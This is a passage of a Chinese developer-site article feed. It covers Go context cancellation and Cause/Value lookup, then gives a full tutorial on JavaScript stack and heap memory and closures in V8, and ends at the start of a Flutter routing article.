		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// 兜底方案：父Context不是cancelCtx也不是afterFuncer，但可取消（Done()≠nil） 自己实现的 Context</span>
	goroutines.Add(<span class="hljs-number">1</span>)
	<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-keyword">select</span> {
		<span class="hljs-keyword">case</span> &lt;-parent.Done():
			<span class="hljs-comment">// 父取消时，取消子Context</span>
			child.cancel(<span class="hljs-literal">false</span>, parent.Err(), Cause(parent))
		<span class="hljs-keyword">case</span> &lt;-child.Done():
			<span class="hljs-comment">// 子先取消，无需处理</span>
		}
	}()
}
</code></pre>
<h3 data-id="heading-17">核心函数 <code>context.Cause</code></h3>
<p><code>Cause</code> 是用户获取 Context 取消原因的 <strong>唯一入口</strong>， <code>errgroup</code> 在 <code>wait</code> 判断时，可以拿到第一个错误，你也可以调用这个函数拿到错误，阅读源码我们知道，<code>errgroup</code> 内部主动 <code>cancel(err)</code> 传入了错误，并存储在了 <code>cause</code> 当然可以用该函数拿出</p>
<p>后续可以通过 <code>cause := context.Cause(ctx)</code>  拿到错误</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Cause</span><span class="hljs-params">(c Context)</span></span> <span class="hljs-type">error</span> {
    <span class="hljs-comment">// 每个 Context 都有 Value(key any) any 这个函数 </span>
	<span class="hljs-keyword">if</span> cc, ok := c.Value(&amp;cancelCtxKey).(*cancelCtx); ok {
		cc.mu.Lock()
		cause := cc.cause
		cc.mu.Unlock()
		<span class="hljs-keyword">if</span> cause != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span> cause
		}
	}

	<span class="hljs-keyword">return</span> c.Err()
}

</code></pre>
<h3 data-id="heading-18"><code>Value</code> 函数</h3>
<p>其实就是递归向上找，我们这种情况直接返回，需要想上找的情况是自己存的业务 <code>key</code> ，后面会举例</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span></span> Value(key any) any {
	<span class="hljs-keyword">if</span> key == &amp;cancelCtxKey {
		<span class="hljs-keyword">return</span> c
	}
	<span class="hljs-keyword">return</span> value(c.Context, key)
}

<span class="hljs-comment">// switch 所有的 已知的 context 找不到继续 向上找</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">value</span><span class="hljs-params">(c Context, key any)</span></span> any {
	<span class="hljs-keyword">for</span> {
		<span class="hljs-keyword">switch</span> ctx := c.(<span class="hljs-keyword">type</span>) {
		<span class="hljs-keyword">case</span> *valueCtx:
			<span class="hljs-keyword">if</span> key == ctx.key {
				<span class="hljs-keyword">return</span> ctx.val
			}
			c = ctx.Context
		<span class="hljs-keyword">case</span> *cancelCtx:
			<span class="hljs-keyword">if</span> key == &amp;cancelCtxKey {
				<span class="hljs-keyword">return</span> c
			}
			c = ctx.Context
		<span class="hljs-keyword">case</span> withoutCancelCtx:
			<span class="hljs-keyword">if</span> key == &amp;cancelCtxKey {
				<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
			}
			c = ctx.c
		<span class="hljs-keyword">case</span> *timerCtx:
			<span class="hljs-keyword">if</span> key == &amp;cancelCtxKey {
				<span class="hljs-keyword">return</span> &amp;ctx.cancelCtx
			}
			c = ctx.Context
		<span class="hljs-keyword">case</span> backgroundCtx, todoCtx:  <span class="hljs-comment">// 空 emptyCtx</span>
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
		<span class="hljs-keyword">default</span>:
			<span class="hljs-keyword">return</span> c.Value(key)
		}
	}
}
</code></pre>
<h3 data-id="heading-19">自定义业务 key</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 自定义业务 key</span>
<span class="hljs-keyword">type</span> userKey <span class="hljs-keyword">struct</span>{}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 根 context，存入业务数据</span>
    ctx1 := context.WithValue(context.Background(), userKey{}, <span class="hljs-string">"张三"</span>)
    
    <span class="hljs-comment">// 在它基础上创建 cancelCtx</span>
    ctx2, cancel := context.WithCancel(ctx1)
    
    <span class="hljs-comment">// 再套一层 cancelCtx</span>
    ctx3, cancel2 := context.WithCancel(ctx2)
    
    <span class="hljs-comment">// 现在的结构：</span>
    <span class="hljs-comment">// Background (空)</span>
    <span class="hljs-comment">//    └── ctx1 (valueCtx, 存了 userKey="张三")</span>
    <span class="hljs-comment">//           └── ctx2 (cancelCtx)</span>
    <span class="hljs-comment">//                  └── ctx3 (cancelCtx)  ← 我们拿着这个</span>
    
    <span class="hljs-comment">// 查询业务数据：ctx3 本身没有，会递归向上找</span>
    user := ctx3.Value(userKey{})
    fmt.Println(<span class="hljs-string">"找到用户:"</span>, user)  <span class="hljs-comment">// 输出: 找到用户: 张三</span>
    
    <span class="hljs-comment">// 即使 cancel 了，依然能找到</span>
    cancel2()
    cancel()
    
    user2 := ctx3.Value(userKey{})
    fmt.Println(<span class="hljs-string">"cancel后:"</span>, user2)  <span class="hljs-comment">// 输出: cancel后: 张三</span>
}
</code></pre>
<h2 data-id="heading-20">总结</h2>
<p><code>errgroup</code> 是对  <code>sync.WaitGroup </code> 的增强封装，可以对 goroutine 数量限制 ，并且不需要显式的写<code>WaitGroup..Add(1)</code>，内部自动管理，防止漏写，出错自动 <code>cancel</code></p>
<p>如果自己相加业务逻辑 直接可以复制代码，按自己的需求添加字段或者函数</p>
<p>对于 <code>context</code> 源代码，要搞清楚当 <code>cancel</code> 后切断的是父对子的连接，但子有个字段专门存放父，这个并没有切断，才使得我们可以调用 <code>context.Cause</code> 方法一直向上找</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 内存机制与闭包原理深度剖析]]></title>    <link>https://juejin.cn/post/7602411521072087059</link>    <guid>https://juejin.cn/post/7602411521072087059</guid>    <pubDate>2026-02-03T10:02:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602411521072087059" data-draft-id="7602401081265504292" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 内存机制与闭包原理深度剖析"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-02-03T10:02:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NEXT06"/> <meta itemprop="url" content="https://juejin.cn/user/1176918763246011"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 内存机制与闭包原理深度剖析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1176918763246011/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NEXT06
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:02:42.000Z" title="Tue Feb 03 2026 10:02:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常的前端开发中，我们往往专注于业务逻辑的实现，而忽略了 JavaScript 引擎底层的内存管理。作为一门高级语言，JavaScript 确实帮我们屏蔽了手动分配和释放内存的繁琐（如 C 语言中的 malloc 和 free），但这并不意味着我们可以完全无视内存机制。</p>
<p>你是否遇到过这样的困惑：为什么修改一个变量会莫名其妙地影响另一个变量？为什么看似执行完毕的函数，其内部变量却依然驻留在内存中？或者在性能优化时，面对内存泄漏束手无策？</p>
<p>这一切的答案，都隐藏在 JavaScript 的内存布局与闭包的底层实现之中。如果不理解这些底层原理，就很难写出高性能且健壮的代码。本文将结合 V8 引擎的实现机制，深入剖析 JS 的内存管理与闭包真相。</p>
<h2 data-id="heading-0">一、JS 的内存世界：栈与堆</h2>
<p>JavaScript 引擎（以 Chrome V8 为例）在执行代码时，会将内存划分为两个核心区域：<strong>栈内存（Stack）</strong>  和 <strong>堆内存（Heap）</strong> 。这种划分并非随意为之，而是为了在“执行效率”与“存储容量”之间找到平衡。</p>
<h3 data-id="heading-1">1. 栈内存（Stack）：执行的主战场</h3>
<p>栈内存主要用于存储<strong>基本数据类型</strong>（Number, String, Boolean, Undefined, Null, Symbol, BigInt）以及<strong>执行上下文（Execution Context）</strong> 。</p>
<ul>
<li><strong>特点</strong>：空间较小，内存地址连续。</li>
<li><strong>管理方式</strong>：遵循“后进先出”（LIFO）原则。</li>
<li><strong>优势</strong>：操作极快。V8 引擎只需移动栈顶指针（ESP），即可完成上下文的切换和内存的回收。</li>
</ul>
<p>由于 JavaScript 是单线程语言，主线程的调用栈切换非常频繁。如果栈内存过大或存储的数据结构过于复杂，会导致栈指针移动受阻，直接阻塞主线程，造成页面卡顿。因此，栈主要用于处理轻量级的数据和维持程序执行流。</p>
<h3 data-id="heading-2">2. 堆内存（Heap）：数据的仓库</h3>
<p>堆内存用于存储<strong>引用数据类型</strong>（Object, Array, Function 等）。</p>
<ul>
<li><strong>特点</strong>：空间巨大，内存地址不连续（杂乱）。</li>
<li><strong>管理方式</strong>：由垃圾回收器（GC）进行管理。</li>
<li><strong>劣势</strong>：内存分配和回收的开销较大。</li>
</ul>
<h3 data-id="heading-3">3. 代码实战：赋值行为的差异</h3>
<p>理解了栈和堆的区别，就能解释为什么不同类型的变量在赋值时表现截然不同。</p>
<p><strong>场景一：基本类型的赋值（值拷贝）</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// 对应 File 1.js
function foo() {
    var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">; </span>
    var <span class="hljs-attr">b</span> = a<span class="hljs-comment">; // 在栈中开辟新空间，将 1 拷贝给 b</span>
    <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;     // 修改 a，不影响 b</span>
    console.log(a)<span class="hljs-comment">; // 2</span>
    console.log(b)<span class="hljs-comment">; // 1</span>
}
foo()<span class="hljs-comment">;</span>
</code></pre>
<p>对于基本类型，变量直接在栈中存储其<strong>值</strong>。var b = a 执行的是<strong>完整的值拷贝</strong>，a 和 b 在内存中是完全独立的两个块。</p>
<p><strong>场景二：引用类型的赋值（地址拷贝）</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-css" lang="css">// 对应 File <span class="hljs-number">2</span><span class="hljs-selector-class">.js</span>
function foo() {
    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = {name: <span class="hljs-string">"极客时间"</span>}; // 堆中存储对象，栈中 <span class="hljs-selector-tag">a</span> 存储该对象的堆地址
    <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>;                // 栈中 <span class="hljs-selector-tag">b</span> 复制了 <span class="hljs-selector-tag">a</span> 的地址指针
    <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = "极客邦";         // 通过地址修改堆中的实体
    console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // {name: <span class="hljs-string">"极客邦"</span>}
    console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // {name: <span class="hljs-string">"极客邦"</span>}
}
foo();
</code></pre>
<p>对于引用类型，变量在栈中存储的是<strong>指向堆内存的地址（指针）</strong> ，真正的实体数据存在堆中。var b = a 仅仅是拷贝了这个指针。因此，a 和 b 指向同一个堆内存块，修改其中一个，必然影响另一个。</p>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07b90eda429f43ff9b5c9264ad6bb34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTkVYVDA2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717762&amp;x-signature=MjXhPw77oW1s5brelPbQhI93vaU%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">二、动态类型的双刃剑</h2>
<p>JavaScript 是一门<strong>动态弱类型</strong>语言，这意味着变量本身没有类型，<strong>值</strong>才有类型，且类型可以在运行时改变。</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// 对应 File 3.js
var bar<span class="hljs-comment">; </span>
<span class="hljs-attr">bar</span> = <span class="hljs-number">12</span><span class="hljs-comment">;           // Number</span>
<span class="hljs-attr">bar</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;    // String</span>
<span class="hljs-attr">bar</span> = {name: <span class="hljs-string">"G"</span>}<span class="hljs-comment">;  // Object</span>
</code></pre>
<p>相比之下，C 语言等静态语言在编译阶段就需要确定变量类型和内存大小：</p>
<p>C</p>
<pre><code class="hljs language-ini" lang="ini">// 对应 File 4.c
int <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">; // 编译期分配 4 字节</span>
char* <span class="hljs-attr">b</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
</code></pre>
<p><strong>对比分析</strong>：</p>
<ul>
<li><strong>静态语言</strong>：编译器知道 int 永远占 4 个字节，因此可以生成极其高效的内存指令。</li>
<li><strong>JavaScript</strong>：V8 引擎无法在编译期确定 bar 到底需要多少空间（可能是 8 字节的数字，也可能是巨大的对象）。</li>
</ul>
<p>为了应对这种动态性，V8 采用了复杂的**对象模型（Object Model）<strong>和</strong>隐藏类（Hidden Class）**技术，将易变的数据结构尽量标准化。这也解释了为什么在 JS 中不建议频繁更改对象的形状（如动态添加属性），因为这会破坏引擎的优化策略。</p>
<p>值得注意的是 JS 的一个历史遗留 Bug：</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>); <span class="hljs-comment">// "object"</span>
</code></pre>
<p>这是因为在 JS 的第一版实现中，使用低位二进制标签表示类型，000 开头表示对象，而 null 全是 0，导致被误判为 Object。为了兼容性，这个 Bug 被保留至今。</p>
<h2 data-id="heading-5">三、闭包的底层真相：逃逸的变量</h2>
<p>许多开发者对闭包的理解仅停留在“函数内部访问外部变量”。但从内存角度看，<strong>闭包的本质是变量从栈内存“逃逸”到了堆内存</strong>。</p>
<p>按照常规逻辑，函数执行完毕后，其执行上下文（Execution Context）会从调用栈弹出，栈上的局部变量应该被销毁。那么，闭包是如何让变量“活”下来的？</p>
<h3 data-id="heading-6">1. 预扫描与逃逸分析</h3>
<p>V8 引擎在执行代码前，会进行<strong>词法扫描（Scoping）</strong> 。</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// 对应 File 6.html
function foo() {
    var <span class="hljs-attr">myName</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">; // 外部变量</span>
    let <span class="hljs-attr">test1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    const <span class="hljs-attr">test2</span> = <span class="hljs-number">2</span><span class="hljs-comment">;        // 未被内部函数引用</span>
    
    var <span class="hljs-attr">innerBar</span> = { 
        setName: function(newName){
            <span class="hljs-attr">myName</span> = newName<span class="hljs-comment">; // 引用 myName</span>
        },
        getName: function(){
            console.log(test1)<span class="hljs-comment">; // 引用 test1</span>
            return myName<span class="hljs-comment">;</span>
        }
    }
    return innerBar<span class="hljs-comment">;</span>
}
var <span class="hljs-attr">bar</span> = foo()<span class="hljs-comment">;</span>
</code></pre>
<p><strong>执行过程深度剖析</strong>：</p>
<ol>
<li>
<p><strong>编译阶段</strong>：当编译 foo 函数时，引擎会快速扫描其内部函数（setName, getName）。</p>
</li>
<li>
<p><strong>闭包检测</strong>：引擎发现内部函数引用了 foo 作用域下的 myName 和 test1。</p>
</li>
<li>
<p><strong>堆内存分配</strong>：</p>
<ul>
<li>引擎判断这两个变量需要“长生不老”，于是不会把它们仅仅放在栈上。</li>
<li>引擎会在<strong>堆内存</strong>中创建一个专门的对象（通常称为 Closure Scope 或 Context Extension）。</li>
<li>myName 和 test1 被存储到这个堆对象中。</li>
<li><strong>注意</strong>：test2 没有被引用，所以它依然只留在栈上，随 foo 执行结束而销毁。</li>
</ul>
</li>
<li>
<p><strong>引用维持</strong>：foo 返回的 innerBar 对象中，包含了指向这个堆内存闭包对象的指针（即 [[Scopes]] 属性）。</p>
</li>
</ol>
<h3 data-id="heading-7">2. 执行结束后的内存状态</h3>
<p>当 foo() 执行完毕出栈后：</p>
<ul>
<li>foo 的执行上下文被销毁。</li>
<li>栈上的 test2 被销毁。</li>
<li><strong>堆上的闭包对象依然存在</strong>，因为 bar 变量引用了 innerBar，而 innerBar 引用了该闭包对象。</li>
</ul>
<p>这就是闭包的“魔法”：<strong>通过在堆中开辟空间，打破了栈内存的生命周期限制。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75b14f9933324377a46a6fcd9153272a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTkVYVDA2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770717762&amp;x-signature=cMPRizfOzCMZo96CW5pVH1zeUYA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">四、闭包实战与陷阱</h2>
<p>理解了内存模型，我们来看两个容易踩坑的实战题目。</p>
<h3 data-id="heading-9">题目 1：共享的闭包环境</h3>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">function createCounter() {
    let <span class="hljs-attr">count</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    return {
        increment: function() { count++<span class="hljs-comment">; },</span>
        get: function() { return count<span class="hljs-comment">; }</span>
    }<span class="hljs-comment">;</span>
}

const <span class="hljs-attr">counterA</span> = createCounter()<span class="hljs-comment">;</span>
const <span class="hljs-attr">counterB</span> = createCounter()<span class="hljs-comment">;</span>

counterA.increment()<span class="hljs-comment">;</span>
console.log(counterA.get())<span class="hljs-comment">; // 输出什么？</span>
console.log(counterB.get())<span class="hljs-comment">; // 输出什么？</span>
</code></pre>
<p><strong>解析</strong>：</p>
<ul>
<li>输出：1 和 0。</li>
<li><strong>原因</strong>：每次调用 createCounter 都会创建一个<strong>新的</strong>执行上下文，并在堆中分配一个<strong>新的</strong>闭包对象。counterA 和 counterB 拥有各自独立的闭包环境，互不干扰。</li>
</ul>
<h3 data-id="heading-10">题目 2：引用的副作用</h3>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">function foo() {
    var <span class="hljs-attr">myName</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;</span>
    var <span class="hljs-attr">inner</span> = {
        setName: function(name) { <span class="hljs-attr">myName</span> = name<span class="hljs-comment">; },</span>
        getName: function() { return myName<span class="hljs-comment">; }</span>
    }<span class="hljs-comment">;</span>
    return inner<span class="hljs-comment">;</span>
}

var <span class="hljs-attr">bar1</span> = foo()<span class="hljs-comment">;</span>
bar1.setName("极客邦")<span class="hljs-comment">;</span>
console.log(bar1.getName())<span class="hljs-comment">; // 输出 "极客邦"</span>
</code></pre>
<p><strong>解析</strong>：</p>
<ul>
<li>这里 setName 和 getName 是定义在同一个 foo 调用中的。</li>
<li>它们共享同一个堆内存中的 Closure(foo) 对象。</li>
<li>setName 修改的是堆中那个唯一的 myName，所以 getName 读取到的也是修改后的值。</li>
</ul>
<p><strong>陷阱提示</strong>：这也意味着，如果不小心持有了对闭包的引用且不释放（例如将回调函数挂载到全局事件上），那么这个闭包对象及其引用的所有变量将永远驻留在堆内存中，造成<strong>内存泄漏</strong>。</p>
<h2 data-id="heading-11">五、总结</h2>
<p>JavaScript 的内存管理机制是其灵活性与性能之间的精妙平衡：</p>
<ol>
<li><strong>栈（Stack）</strong> ：负责程序执行的控制流和短期数据的存储，追求极致的速度。</li>
<li><strong>堆（Heap）</strong> ：负责长期大数据的存储，通过引用计数和标记清除等 GC 算法管理生命周期。</li>
<li><strong>闭包（Closure）</strong> ：本质是<strong>空间换时间</strong>。它牺牲了堆内存空间，换取了变量生命周期的延长和状态的封装。</li>
</ol>
<p>作为开发者，我们不需要手动 malloc 内存，但必须清晰地知道每一行代码背后，变量究竟是在栈上瞬息即逝，还是在堆中长久驻留。只有对内存保持敬畏，才能在享受 JavaScript 动态特性的同时，写出高效、稳定的应用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter——页面跳转（路由、导航）]]></title>    <link>https://juejin.cn/post/7602440800295747630</link>    <guid>https://juejin.cn/post/7602440800295747630</guid>    <pubDate>2026-02-03T10:06:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800295747630" data-draft-id="7602303923171426313" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter——页面跳转（路由、导航）"/> <meta itemprop="keywords" content="APP,Flutter"/> <meta itemprop="datePublished" content="2026-02-03T10:06:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Haha_bj"/> <meta itemprop="url" content="https://juejin.cn/user/2612027844214647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter——页面跳转（路由、导航）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612027844214647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Haha_bj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:06:17.000Z" title="Tue Feb 03 2026 10:06:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
